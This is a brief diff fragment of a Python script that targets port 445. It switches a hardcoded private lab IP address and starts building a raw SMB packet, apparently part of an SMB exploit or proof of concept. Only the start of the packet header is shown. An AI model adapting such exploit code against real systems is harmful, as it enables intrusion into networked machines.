@@ -8,7 +8,7 @@ from socket import socket
 from time import sleep
 
 host = sys.argv[1], 445
-host = "192.168.33.14", 445
+host = "192.168.33.13", 445
 buff = (
 "\x00\x00\x00\x90" # Begin SMB header: Session message
 "\xff\x53\x4d\x42" # Server Component: SMB
